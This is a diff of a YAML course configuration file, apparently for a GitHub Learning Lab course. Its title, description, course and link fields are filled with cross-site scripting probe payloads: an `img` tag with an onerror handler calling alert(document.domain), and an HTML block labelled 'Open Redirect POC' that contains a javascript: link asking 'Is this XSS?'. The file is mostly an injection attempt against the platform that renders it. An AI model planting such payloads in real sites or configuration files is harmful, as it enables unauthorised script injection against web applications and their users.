@@ -1,4 +1,6 @@
-title: '<><img src=1 onerror=alert(document.domain)> '
+title: >-
+  <div class="alert alert-danger" id="error_explanation"><h4>Open Redirect
+  POC:</h4><ul><li><a href="javascript:alert()">Is this XSS?</a></li></ul></div>
 description: '<><img src=1 onerror=alert(document.domain)> '
 steps:
   - course: githubtraining/introduction-to-github
@@ -8,3 +10,25 @@ steps:
     description: >-
       There are many more courses available on Learning Lab for you to check
       out.
+  - title: New step
+    actions:
+      - type: createIssue
+        title: A new issue
+        body: a-response-file.md
+    course: >-
+      <div class="alert alert-danger" id="error_explanation"><h4>Open Redirect
+      POC:</h4><ul><li><a href="javascript:alert()">Is this
+      XSS?</a></li></ul></div>
+    description: >-
+      <div class="alert alert-danger" id="error_explanation"><h4>Open Redirect
+      POC:</h4><ul><li><a href="javascript:alert()">Is this
+      XSS?</a></li></ul></div>
+    link: >-
+      <div class="alert alert-danger" id="error_explanation"><h4>Open Redirect
+      POC:</h4><ul><li><a href="javascript:alert()">Is this
+      XSS?</a></li></ul></div>
+  - title: New step
+    actions:
+      - type: createIssue
+        title: A new issue
+        body: a-response-file.md
